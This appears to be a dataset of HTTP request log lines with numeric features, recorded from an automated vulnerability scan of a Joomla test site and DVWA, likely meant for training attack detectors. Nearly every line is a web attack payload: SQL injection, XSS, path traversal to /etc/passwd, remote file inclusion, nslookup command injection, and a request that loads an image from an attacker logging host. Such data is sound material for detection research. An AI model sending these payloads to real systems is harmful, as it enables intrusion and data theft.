49,2,500,1983,7,22,9,2,1,GET /index.php?format=feed&type=371-0-0- HTTP/1.1
103,3,500,2089,8,65,14,5,1,GET /index.php/component/content/?format=feed&type=rss&view=featured<body%20onload=p3oZ(9307)> HTTP/1.1
105,3,200,3177,7,76,9,9,1,GET /index.php/component/search/?ordering=popular&searchphrase=any&searchword=file:///etc/passwd HTTP/1.1
100,3,200,3146,7,66,12,5,1,GET /index.php/component/search/?ordering=category&searchphrase=all&searchword=%f0''%f0\"\" HTTP/1.1
20,1,404,497,7,5,1,3,1,GET /wstat/ HTTP/1.1
146,3,500,2177,8,106,14,8,1,GET /index.php/component/content/?format=feed&type=rss&view=http://some-inexistent-website.acu/some_inexistent_file_with_long_name%3F.jpg HTTP/1.1
134,2,500,2091,18,34,39,2,1,GET /index.php?format=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%2500.jpg&type=atom HTTP/1.1
102,3,200,3170,7,75,10,6,0,GET /index.php/component/search/?ordering=newest&searchphrase=all&searchword=/www.vulnweb.com HTTP/1.1
31,1,404,507,7,15,2,3,1,GET //registration.asp HTTP/1.1
120,3,200,3144,8,87,12,9,0,GET /index.php/component/search/?ordering=popular&searchphrase=Http://testasp.vulnweb.com/t/fit.txt&searchword= HTTP/1.1
103,3,200,3084,7,74,9,9,1,GET /index.php/component/search/?ordering=category&searchphrase=file:///etc/passwd&searchword= HTTP/1.1
120,3,500,1983,7,80,14,5,1,GET /index.php/component/content/?format=feed&type=%24{%40print(md5(acunetix_wvs_security_test))}&view=featured HTTP/1.1
152,3,200,3238,7,71,40,30,1,GET /index.php/component/search/?ordering=newest&searchphrase=any&searchword=../..//../..//../..//../..//../..//../..//../..//../..//etc/passwd HTTP/1.1
131,3,200,1524,7,85,17,4,1,GET /index.php/2-uncategorised/1-testsayfasi?page=%24{%40print(md5(acunetix_wvs_security_test))}%5c&print=1&tmpl=component HTTP/1.1
55,1,200,2763,12,29,4,5,0,POST /index.php/component/users/?task=KCXg2tGf HTTP/1.1
101,3,200,3121,7,72,9,9,1,GET /index.php/component/search/?ordering=newest&searchphrase=file:///etc/passwd&searchword= HTTP/1.1
100,3,200,1524,7,71,12,4,0,GET /index.php/2-uncategorised/1-testsayfasi?page=&print=testasp.vulnweb.com&tmpl=component HTTP/1.1
114,1,404,3988,7,76,10,6,1,GET /index.php/component/content/category/%24{%40print(md5(acunetix_wvs_security_test))}%5c-uncategorised HTTP/1.1
92,1,200,3300,9,34,19,4,1,GET /index.php/-1'%20OR%203*2<(0%2b5%2b324-324)%20--%20-uncategorised/1-testsayfasi HTTP/1.1
93,1,200,2784,14,39,17,5,1,POST /index.php/component/users/?task=USkGA3VO';%20waitfor%20delay%20'0:0:6'%20--%20 HTTP/1.1
96,1,302,384,11,27,29,21,1,GET /DVWA/instructions.php?doc=/.././.././.././.././.././.././.././../etc/./passwd%2500 HTTP/1.1
173,1,200,2851,18,83,45,7,1,POST /index.php/component/users/?task=if(now()=sysdate()%2csleep(4)%2c0)/*'XOR(if(now()=sysdate()%2csleep(4)%2c0))OR'\"XOR(if(now()=sysdate()%2csleep(4)%2c0))OR\"*/ HTTP/1.1
157,3,200,3184,8,117,14,8,0,GET /index.php/component/search/?ordering=http://some-inexistent-website.acu/some_inexistent_file_with_long_name%3F.jpg&searchphrase=any&searchword= HTTP/1.1
24,1,404,501,7,9,2,2,1,GET /backup.sql HTTP/1.1
145,1,200,237,19,43,37,5,0,POST /index.php/component/users/?task=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%2500.register HTTP/1.1
156,3,200,338,11,70,21,5,1,GET /index.php/component/mailto/?link=0011f090d89f910f3d24e9873575a8d16029ca3e&template=beez_20&tmpl=TqvlJgEW';%20waitfor%20delay%20'0:0:9'%20--%20 HTTP/1.1
226,1,404,637,16,37,35,6,1,GET /%2569%256E%2564%2565%2578%252E%2570%2568%2570%253C%2553%2563%2552%2569%2550%2574%2520%253E%254B%256D%2550%2547%25289291%2529%253C%252F%2573%2543%2572%2569%2570%2554%253E/component/content/category/2-uncategorised HTTP/1.1
97,3,200,3148,7,70,10,6,0,GET /index.php/component/search/?ordering=newest&searchphrase=all&searchword=index.php/. HTTP/1.1
52,2,500,1983,7,26,8,2,1,GET /index.php?format=feed&type=%40%401rfpd HTTP/1.1
132,5,200,3200,7,88,21,5,1,GET /index.php/component/search/?searchword=ul.menu'\"()&%kzsy(9188)=&ordering=category&searchphrase=all&areas[0]=newsfeeds HTTP/1.1
80,1,404,3990,7,45,11,2,1,GET /index.php?option=%24{%40print(md5(acunetix_wvs_security_test))}%5c HTTP/1.1
117,1,404,537,7,49,19,6,1,GET /index.php/component/12345'\"\\'\\\");|]*%00{%0d%0a<%00>%bf%27'\xf0\x9f\x92\xa9/category/2-uncategorised HTTP/1.1
122,3,500,2063,7,57,30,22,1,GET /index.php/component/content/?format=feed&type=rss&view=/../..//../..//../..//../..//../..//etc/passwd%00.jpg HTTP/1.1
30,1,404,507,7,13,2,4,1,GET /cgi-bin/awstats/ HTTP/1.1
105,3,200,3180,7,72,11,5,1,GET /index.php/component/search/?searchword=ul.menu\"kzsy(9329)&ordering=oldest&searchphrase=any HTTP/1.1
152,3,200,3230,7,85,32,12,1,GET /index.php/component/search/?ordering=category&searchphrase=all&searchword=.%5c%5c./.%5c%5c./.%5c%5c./.%5c%5c./.%5c%5c./.%5c%5c./etc/passwd HTTP/1.1
81,1,404,3988,13,51,5,8,1,GET /index.php/component/content/category//WEB-INF/web.xml-uncategorised HTTP/1.1
79,1,200,3228,7,55,4,7,0,GET /index.php/component/content/article/2-uncategorised/1-testsayfasi HTTP/1.1
74,1,404,492,7,28,10,4,1,GET /1%00%c0%a7%c0%a2%252527%252522/2-uncategorised/1-testsayfasi HTTP/1.1
30,1,404,507,7,11,3,2,1,GET /backup192.tar.gz HTTP/1.1
81,3,500,2055,7,53,10,5,1,GET /index.php/component/content/?format=feed&type=rss&view=index.php%00 HTTP/1.1
46,1,200,3276,9,22,5,4,0,GET /index.php/2-uncategorised/1-JyI= HTTP/1.1
93,1,404,564,7,55,10,4,1,GET /%24{%40print(md5(acunetix_wvs_security_test))}%5c/2-uncategorised/1-testsayfasi HTTP/1.1
91,1,200,3299,11,48,14,4,1,GET /index.php/KKowVt0U';select%20pg_sleep(6);%20--%20-uncategorised/1-testsayfasi HTTP/1.1
89,1,200,3516,9,36,14,4,0,GET /index.php/2-uncategorised/-1%20OR%202%2b138-138-1=0%2b0%2b0%2b1-testsayfasi HTTP/1.1
99,1,404,586,7,42,27,7,1,GET /index.php<img<!--%20-->%20src=x%20onerror=alert(9213);//><!--%20-->/component/search/ HTTP/1.1
74,1,404,537,7,46,4,5,1,GET /index.php/1some_inexistent_file_with_long_name%00.jpg/users/ HTTP/1.1
83,3,200,3088,7,58,9,5,0,GET /index.php/component/search/?ordering=alpha&searchphrase=)&searchword= HTTP/1.1
121,4,200,3149,13,86,12,5,1,GET /index.php/component/search/?searchword=&ordering=popular&searchphrase=acxScRiPtkzsyScRiPt&areas[0]=contacts HTTP/1.1
35,1,404,516,7,15,2,5,1,GET /'\"/component/search/ HTTP/1.1
71,1,200,3827,7,50,2,6,0,GET /administrator/templates/bluestork/images/j_login_lock.png HTTP/1.1
103,1,500,2065,9,50,14,7,1,GET /index.php/component/content/-1%20OR%203*2>(0%2b5%2b172-172)/2-uncategorised/1-testsayfasi HTTP/1.1
90,1,404,551,9,28,18,4,1,GET /-1'%20OR%202%2b639-639-1=0%2b0%2b0%2b1%20--%20/2-uncategorised/1-testsayfasi HTTP/1.1
106,3,500,2073,7,57,19,5,1,GET /index.php/component/content/?format=feed&type=rss&view=1%20waitfor%20delay%20'0:0:9'%20--%20 HTTP/1.1
234,3,500,2173,14,46,40,5,1,GET /index.php/component/content/?format=feed&type=atom&view=%2566%2565%2561%2574%2575%2572%2565%2564%253C%2553%2563%2552%2569%2550%2574%2520%253E%2570%2533%256F%255A%25289144%2529%253C%252F%2573%2543%2572%2569%2570%2554%253E HTTP/1.1
4169,3,200,3192,7,72,2049,2037,1,GET /index.php/component/search/?ordering=invalid../../../../../../../../../../etc/passwd/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.&searchphrase=all&searchword= HTTP/1.1
80,1,500,2051,7,48,7,7,1,GET /index.php/component/content/178-0-0-/2-uncategorised/1-testsayfasi HTTP/1.1
123,3,200,3239,9,66,18,5,0,GET /index.php/component/search/?ordering=oldest&searchphrase=all&searchword=-1%20OR%202%2b898-898-1=0%2b0%2b0%2b1 HTTP/1.1
35,1,404,3995,9,14,3,5,1,GET /index.php/JyI=/users/ HTTP/1.1
145,4,200,3288,7,100,16,5,0,GET /index.php/component/search/?searchword=ul.menuu0022onmouseover=kzsy(9580)u0022&ordering=popular&searchphrase=all&areas[0]=newsfeeds HTTP/1.1
163,3,200,338,7,70,29,14,1,GET /index.php/component/mailto/?link=0011f090d89f910f3d24e9873575a8d16029ca3e&template=beez_20&tmpl=/%5c../%5c../%5c../%5c../%5c../%5c../%5c../etc/passwd HTTP/1.1
119,3,200,3197,11,76,15,6,1,GET /index.php/component/search/?ordering=category&searchphrase=all&searchword=1\"><script>RBUT(9011)</script> HTTP/1.1
130,4,200,3193,13,94,13,5,1,GET /index.php/component/search/?searchword=ul.menu&ordering=newest&searchphrase=allacxScRiPtkzsyScRiPt&areas[0]=weblinks HTTP/1.1
119,3,200,3155,7,64,28,5,0,GET /index.php/component/search/?ordering=popular&searchphrase=any&searchword=%5e(%23%24!%40%23%24)(()))****** HTTP/1.1
82,3,500,2051,7,48,12,5,1,GET /index.php/component/content/?format=feed&type=atom&view=%f0''%f0\"\" HTTP/1.1
70,3,500,2051,7,45,9,5,1,GET /index.php/component/content/?format=feed&type=rss&view=) HTTP/1.1
71,1,404,3995,7,43,8,5,1,GET /index.php/;print(md5(acunetix_wvs_security_test));/users/ HTTP/1.1
27,1,404,504,7,7,3,2,1,GET /backup-192.7z HTTP/1.1
49,1,404,524,7,28,3,7,1,GET ///www.vulnweb.com/component/search/ HTTP/1.1
123,1,400,485,7,53,34,23,1,GET /index.php/component/content/article/2-../../../../../../../../../../../../../../../proc/version/1-testsayfasi HTTP/1.1
118,1,500,2115,11,82,7,7,1,GET /index.php/component/content/%0aSomeCustomInjectedHeader:%20injected_by_wvs/2-uncategorised/1-testsayfasi HTTP/1.1
144,1,404,590,7,80,35,8,1,GET /..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd/component/content/article/2-uncategorised/1-testsayfasi HTTP/1.1
96,1,500,2105,8,57,12,5,1,GET /index.php/component/users/?view=login<%25%20contenteditable%20onresize=Uqla(9827)> HTTP/1.1
138,4,200,3242,7,97,16,5,1,GET /index.php/component/search/?searchword=ul.menu\"onmouseover=kzsy(9810)\"&ordering=newest&searchphrase=any&areas[0]=newsfeeds HTTP/1.1
93,3,500,2067,7,47,10,5,1,GET /index.php/component/content/?format=feed&type=atom&view=%24{9999303%2b10000064} HTTP/1.1
115,1,500,2043,7,26,73,5,1,GET /index.php/component/users/?view=))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))) HTTP/1.1
124,4,200,3199,7,86,15,5,1,GET /index.php/component/search/?searchword=ul.menu\"kzsy(9185)&ordering=popular&searchphrase=all&areas[0]=weblinks HTTP/1.1
108,3,200,3172,7,65,20,5,0,GET /index.php/component/search/?ordering=oldest&searchphrase=any&searchword=!(()%26%26!%7c*%7c*%7c HTTP/1.1
85,1,200,3292,7,45,15,4,1,GET /index.php/-1);select%20pg_sleep(6);%20--%20-uncategorised/1-testsayfasi HTTP/1.1
61,1,404,3995,11,32,5,8,1,GET /index.php/http://hitjj0oOIuFSr.bxss.me//search/ HTTP/1.1
95,3,200,338,7,48,22,4,0,GET /index.php/2-uncategorised/1-testsayfasi?page=&print=1&tmpl=!(()%26%26!%7c*%7c*%7c HTTP/1.1
58,1,200,3285,7,32,5,8,1,GET /index.php/2-file:///etc/passwd/1-testsayfasi HTTP/1.1
78,1,404,3995,8,31,15,5,1,GET /index.php/ba2hzVq4';%20waitfor%20delay%20'0:0:6'%20--%20/search/ HTTP/1.1
78,3,500,2045,7,49,11,5,1,GET /index.php/component/content/?format='\"()&type=rss&view=featured HTTP/1.1
108,3,200,3227,7,79,11,7,0,GET /index.php/component/search/?ordering=newest&searchphrase=all&searchword=http://www.vulnweb.com HTTP/1.1
129,5,200,3206,7,85,21,5,1,GET /index.php/component/search/?searchword=ul.menu'\"()&%kzsy(9650)=&ordering=newest&searchphrase=all&areas[0]=contacts HTTP/1.1
45,2,200,2092,7,26,6,2,0,GET /index.php?format=feed&type=atom HTTP/1.1
142,3,200,3156,12,71,25,5,1,GET /index.php/component/search/?ordering=popular&searchphrase=-1'%20OR%202%2b284-284-1=0%2b0%2b0%2b1%20or%20'vjNGOfjl'='&searchword= HTTP/1.1
167,3,500,2091,18,62,41,5,1,GET /index.php/component/content/?format=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%2500.jpg&type=atom&view=featured HTTP/1.1
106,4,200,3165,7,68,16,5,1,GET /index.php/component/search/?searchword='\"()&%kzsy(9043)=&ordering=category&searchphrase=all HTTP/1.1
59,1,500,2011,8,34,6,5,1,POST /index.php/component/users/?task=index.php%00 HTTP/1.1
115,3,500,2071,7,65,14,5,1,GET /index.php/component/content/?format=\"%2bresponse.write(9516735*9901561)%2b\"&type=atom&view=featured HTTP/1.1
145,4,200,3284,8,92,24,5,1,GET /index.php/component/search/?searchword=ul.menu\"%20rjh0=kzsy([!%20!])%20Vrk=\"&ordering=category&searchphrase=all&areas[0]=contacts HTTP/1.1
50,1,500,2039,7,26,5,5,1,GET /index.php/component/users/?view=558' HTTP/1.1
84,1,200,3519,7,45,14,4,1,GET /index.php/2-uncategorised/-1;select%20pg_sleep(2);%20--%20-testsayfasi HTTP/1.1
91,1,200,3521,7,44,17,4,1,GET /index.php/2-uncategorised/-1;%20waitfor%20delay%20'0:0:2'%20--%20-testsayfasi HTTP/1.1
87,1,500,2089,7,41,10,5,1,GET /index.php/component/users/?view=\"%2bresponse.write(9495727*9561186)%2b\" HTTP/1.1
92,3,200,3106,7,61,8,5,0,GET /index.php/component/search/?ordering=alpha&searchphrase=all9512038&searchword= HTTP/1.1
79,3,500,1983,7,50,10,5,1,GET /index.php/component/content/?format=feed&type=643''&view=featured HTTP/1.1
111,1,500,2115,10,69,11,6,1,GET /index.php/component/content/category<%25%20contenteditable%20onresize=KmPG(9087)>/2-uncategorised HTTP/1.1
131,3,200,3139,7,89,15,5,1,GET /index.php/component/search/?ordering=alpha&searchphrase=%24{%40print(md5(acunetix_wvs_security_test))}%5c&searchword= HTTP/1.1
98,3,200,3150,7,64,12,5,1,GET /index.php/component/search/?ordering=newest&searchphrase=all&searchword=%f0''%f0\"\" HTTP/1.1
46,1,200,6751,7,25,2,5,0,GET /templates/beez_20/css/layout.css HTTP/1.1
139,4,200,3282,7,98,16,5,1,GET /index.php/component/search/?searchword=ul.menu\"onmouseover=kzsy(9836)\"&ordering=category&searchphrase=all&areas[0]=contacts HTTP/1.1
149,1,404,3990,8,109,10,10,1,GET /index.php/component/http://some-inexistent-website.acu/some_inexistent_file_with_long_name%3F.jpg/article/2-uncategorised/1-testsayfasi HTTP/1.1
107,3,200,3169,7,78,11,6,0,GET /index.php/component/search/?ordering=category&searchphrase=all&searchword=/%5cwww.vulnweb.com HTTP/1.1
93,1,200,2782,10,42,17,5,1,POST /index.php/component/users/?task=A0Kxrw1j';%20waitfor%20delay%20'0:0:6'%20--%20 HTTP/1.1
96,1,200,3246,7,68,5,11,1,GET /index.php/component/content/article/file:///etc/passwd-uncategorised/1-testsayfasi HTTP/1.1
86,3,200,1102,7,52,12,5,1,GET /index.php/component/content/?format=feed&type=%f0''%f0\"\"&view=featured HTTP/1.1
140,3,200,3236,7,79,29,14,1,GET /index.php/component/search/?ordering=popular&searchphrase=all&searchword=/%5c../%5c../%5c../%5c../%5c../%5c../%5c../etc/passwd HTTP/1.1
86,2,500,2049,9,26,20,2,1,GET /index.php?format=-1%20OR%203%2b444-444-1=0%2b0%2b0%2b1%20--%20&type=atom HTTP/1.1
121,3,200,1522,9,56,24,4,0,GET /index.php/2-uncategorised/1-testsayfasi?page=-1%20OR%203*2<(0%2b5%2b595-595)%20--%20&print=1&tmpl=component HTTP/1.1
98,3,200,3153,7,72,8,7,1,GET /index.php/component/search/?ordering=popular&searchphrase=all&searchword=/etc/passwd HTTP/1.1
129,3,200,3264,7,95,10,5,0,GET /index.php/component/search/?ordering=oldest&searchphrase=all&searchword=1some_inexistent_file_with_long_name%00.jpg HTTP/1.1
108,3,200,3117,11,71,12,5,0,GET /index.php/component/search/?ordering=popular&searchphrase=%24(nslookup%20RsyDy7AK)&searchword= HTTP/1.1
118,4,200,3184,7,81,13,5,0,GET /index.php/component/search/?searchword=ul.menu9107670&ordering=popular&searchphrase=any&areas[0]=content HTTP/1.1
127,4,200,3186,13,92,12,5,1,GET /index.php/component/search/?searchword=the&ordering=newest&searchphrase=allacxScRiPtkzsyScRiPt&areas[0]=newsfeeds HTTP/1.1
64,1,200,236,14,33,7,5,0,POST /index.php/component/users/?task=WEB-INF%5cweb.xml HTTP/1.1
131,4,200,3186,13,95,13,5,1,GET /index.php/component/search/?searchword=ul.menu&ordering=newest&searchphrase=allacxScRiPtkzsyScRiPt&areas[0]=newsfeeds HTTP/1.1
4176,3,200,3354,7,79,2049,2037,1,GET /index.php/component/search/?ordering=popular&searchphrase=all&searchword=invalid../../../../../../../../../../etc/passwd/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././. HTTP/1.1
44,1,200,3277,7,19,8,4,0,GET /index.php/2-<!--/1-testsayfasi HTTP/1.1
94,3,200,3156,9,65,8,5,0,GET /index.php/component/search/?ordering=oldest&searchphrase=any&searchword=VoN00ql1 HTTP/1.1
93,3,200,1524,9,57,12,4,0,GET /index.php/2-uncategorised/1-testsayfasi?page=%40%40HGekg&print=1&tmpl=component HTTP/1.1
79,1,404,554,7,46,11,5,1,GET /';print(md5(acunetix_wvs_security_test));%24a='/component/search/ HTTP/1.1
61,1,200,313,7,42,1,7,0,GET /administrator/templates/bluestork/images/admin/ HTTP/1.1
137,3,200,3283,7,95,16,5,1,GET /index.php/component/search/?ordering=category&searchphrase=all&searchword=\";print(md5(acunetix_wvs_security_test));%24a=\" HTTP/1.1
58,1,302,384,11,33,6,4,0,GET /DVWA/instructions.php?doc=instructions.php/. HTTP/1.1
90,1,500,2045,7,61,5,11,1,GET /index.php/component/content/file:///etc/passwd/2-uncategorised/1-testsayfasi HTTP/1.1
132,1,404,3990,15,71,13,7,1,GET /index.php/component/%26nslookup%20TLfQa2lY%26'%5c\"`0%26nslookup%20TLfQa2lY%26`'/article/2-uncategorised/1-testsayfasi HTTP/1.1
90,3,200,1525,7,58,13,4,1,GET /index.php/2-uncategorised/1-testsayfasi?page=&print=%bf'%bf\"&tmpl=component HTTP/1.1
143,3,200,3226,7,73,38,21,1,GET /index.php/component/search/?ordering=oldest&searchphrase=all&searchword=../../../../../../../../../../../../../../../proc/version HTTP/1.1
109,1,500,2073,8,69,11,9,1,GET /index.php/component/content/category<img%20sRc='http://attacker-9478/log.php%3f/2-uncategorised HTTP/1.1
158,4,200,3314,13,101,24,7,1,GET /index.php/component/search/?searchword=ul.menu\"sTYLe='acu:Expre/**/SSion(kzsy(9339))'bad=\"&ordering=category&searchphrase=any&areas[0]=content HTTP/1.1
80,1,404,3990,7,47,11,6,1,GET /index.php?option=http://testasp.vulnweb.com/t/xss.html%3f%2500.jpg HTTP/1.1
123,5,200,3186,7,80,20,5,1,GET /index.php/component/search/?searchword='\"()&%kzsy(9377)=&ordering=oldest&searchphrase=all&areas[0]=newsfeeds HTTP/1.1
52,1,302,384,11,25,6,3,0,GET /DVWA/security.php?test=set%7cset%26set HTTP/1.1
99,3,200,3105,7,67,10,5,0,GET /index.php/component/search/?ordering=%252fetc%252fpasswd&searchphrase=any&searchword= HTTP/1.1
86,3,200,3089,7,61,9,5,0,GET /index.php/component/search/?ordering=category&searchphrase=)&searchword= HTTP/1.1
143,3,200,3235,7,72,33,23,1,GET /index.php/component/search/?ordering=popular&searchphrase=any&searchword=/.././.././.././.././.././.././.././../etc/./passwd%2500 HTTP/1.1
130,1,404,537,7,59,20,7,1,GET /index.php/component/12345'\"\\'\\\");|]*%00{%0d%0a<%00>%bf%27'\xf0\x9f\x92\xa9/article/2-uncategorised/1-testsayfasi HTTP/1.1
85,1,200,3521,8,52,10,8,0,GET /index.php/2-uncategorised/1-http://testasp.vulnweb.com/t/fit.txt%3F.jpg HTTP/1.1
104,1,500,2085,11,52,16,6,1,GET /index.php/component/content/cI3VbvVZ';%20waitfor%20delay%20'0:0:2'%20--%20/2-uncategorised HTTP/1.1
81,3,200,338,14,46,10,4,0,GET /index.php/2-uncategorised/1-testsayfasi?page=&print=1&tmpl=WSLQCRuZ HTTP/1.1
165,3,200,338,15,74,22,6,1,GET /index.php/component/mailto/?link=0011f090d89f910f3d24e9873575a8d16029ca3e&template=beez_20&tmpl=component'\"()%26%25<acx><ScRiPt%20>pnMW(9499)</ScRiPt> HTTP/1.1
171,1,200,237,8,96,42,7,1,POST /index.php/component/users/?task=(select(0)from(select(sleep(2)))v)/*'%2b(select(0)from(select(sleep(2)))v)%2b'\"%2b(select(0)from(select(sleep(2)))v)%2b\"*/ HTTP/1.1
106,3,200,3184,7,62,9,5,1,GET /index.php/component/search/?ordering=newest&searchphrase=all&searchword={{9999402*10000482}} HTTP/1.1
110,3,200,3059,7,60,15,5,0,GET /index.php/component/search/?ordering=1%00%c0%a7%c0%a2%252527%252522&searchphrase=all&searchword= HTTP/1.1
28,1,404,505,9,9,2,2,1,GET /gqdZichO83.jsp HTTP/1.1
98,3,200,3106,13,64,10,7,0,GET /index.php/component/search/?ordering=alpha&searchphrase=/WEB-INF/web.xml&searchword= HTTP/1.1
123,3,200,3115,7,68,28,16,1,GET /index.php/component/search/?ordering=newest&searchphrase=../../../../../../../../../../etc/passwd&searchword= HTTP/1.1
123,4,200,3205,7,85,15,5,1,GET /index.php/component/search/?searchword=ul.menu\"kzsy(9142)&ordering=newest&searchphrase=all&areas[0]=weblinks HTTP/1.1
101,3,200,3113,13,71,8,5,1,GET /index.php/component/search/?searchword=&ordering=acxScRiPtkzsyScRiPt&searchphrase=exact HTTP/1.1
129,4,200,3183,13,93,13,5,1,GET /index.php/component/search/?searchword=ul.menu&ordering=newest&searchphrase=acxScRiPtkzsyScRiPt&areas[0]=categories HTTP/1.1
36,1,404,512,13,11,4,4,1,GET //WEB-INF/jboss-web.xml HTTP/1.1
159,4,200,3329,13,102,24,7,1,GET /index.php/component/search/?searchword=ul.menu\"sTYLe='acu:Expre/**/SSion(kzsy(9549))'bad=\"&ordering=popular&searchphrase=any&areas[0]=newsfeeds HTTP/1.1
24,1,404,501,7,9,2,2,1,GET /index.html HTTP/1.1
91,3,200,3142,7,63,12,5,0,GET /index.php/component/search/?ordering=popular&searchphrase=all&searchword=<!-- HTTP/1.1
84,1,500,2079,13,39,9,5,1,GET /index.php/component/users/?view=acux9481%C0%BEz1%C0%BCz2a%90bcxuca9481 HTTP/1.1
105,1,200,3548,13,40,20,6,1,GET /index.php/component/content/category/2--1'%20OR%203*2<(0%2b5%2b209-209)%20or%20'eRaEhFRv'=' HTTP/1.1
100,3,200,3163,7,68,9,5,0,GET /index.php/component/search/?searchword=ul.menu9729984&ordering=newest&searchphrase=all HTTP/1.1
89,3,200,3166,7,62,9,5,1,GET /index.php/component/search/?ordering=newest&searchphrase=all&searchword='\" HTTP/1.1
